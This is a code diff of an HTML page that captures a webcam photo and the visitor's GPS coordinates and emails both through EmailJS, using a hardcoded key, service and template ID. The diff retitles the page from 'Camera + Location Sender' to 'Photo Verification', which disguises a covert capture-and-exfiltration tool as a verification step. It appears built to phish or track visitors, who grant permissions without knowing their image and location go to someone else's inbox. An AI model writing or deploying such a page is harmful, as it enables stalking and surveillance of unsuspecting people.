@@ -1,23 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera + Location Sender</title>
-
-  <!-- EmailJS Script -->
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-
-  <script>
-    // Initialize EmailJS with your Public Key
-    (function() {
-      emailjs.init("vieRRG0Q8QGFFS-XO");
-    })();
-  </script>
-
-  <style>
-    body { font-family: Arial; padding: 20px; }
-    video { margin-top: 10px; border: 1px solid #ccc; }
-    button { padding: 10px 20px; margin: 10px 5px; font-size: 16px; }
-  </style>
+    <title>Photo Verification</title>
 </head>
 <body>
 
@@ -30,70 +14,72 @@
 
 <video id="video" width="320" height="240" autoplay></video>
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-  <!-- EmailJS Library
--->
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<!- Initialize EmailJs
-II>
-‹script>
-emailjs. init ("vieRRGOQ8QGFFS-X0") ;
-  
-</script>
-<! -- Your main script --›
 
+<!-- EmailJS Library -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<!-- Initialize EmailJS -->
 <script>
+emailjs.init("vieRRG0Q8QGFFS-XO");
+</script>
+
+<!-- MAIN SCRIPT -->
+<script>
+
 let stream;
 
 // Start camera
 async function startCamera() {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    document.getElementById("video").srcObject = stream;
-    document.getElementById("status").innerText = "Camera started!";
-  } catch (err) {
-    document.getElementById("status").innerText = "Camera permission denied.";
-  }
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById("video").srcObject = stream;
+        document.getElementById("status").innerText = "Camera started!";
+    } catch (err) {
+        document.getElementById("status").innerText = "Camera permission denied.";
+    }
 }
 
-// Take photo & send with location
+// Take photo & send
 function takePhoto() {
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const context = canvas.getContext("2d");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
 
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const image = canvas.toDataURL("image/png");
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  document.getElementById("status").innerText = "Photo taken. Getting location...";
+    const image = canvas.toDataURL("image/png");
 
-  // Get location
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition((pos) => {
+    document.getElementById("status").innerText = "Photo taken. Getting location...";
 
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const locationString = lat + ", " + lon;
+    // Get location
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
 
-      // Send email using EmailJS
-      emailjs.send("service_8bf9aat", "template_pee9jcq", {
-        photo: image,
-        location: locationString
-      })
-      .then(() => {
-        document.getElementById("status").innerText = "Photo & location sent to your email!";
-      })
-      .catch((err) => {
-        document.getElementById("status").innerText = "Error sending email.";
-        console.error(err);
-      });
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const locationString = lat + ", " + lon;
 
-    }, () => {
-      document.getElementById("status").innerText = "Location permission denied.";
-    });
-  } else {
-    document.getElementById("status").innerText = "Geolocation not supported.";
-  }
+            // SEND EMAIL USING EMAILJS
+            emailjs.send("service_8bf9aat", "template_pee9jcq", {
+                photo: image,
+                location: locationString
+            })
+            .then(() => {
+                document.getElementById("status").innerText = "Photo & location sent to your email!";
+            })
+            .catch((err) => {
+                document.getElementById("status").innerText = "Error sending email.";
+                console.error(err);
+            });
+
+        }, () => {
+            document.getElementById("status").innerText = "Location permission denied.";
+        });
+    } else {
+        document.getElementById("status").innerText = "Geolocation not supported.";
+    }
 }
+
 </script>
 
 </body>
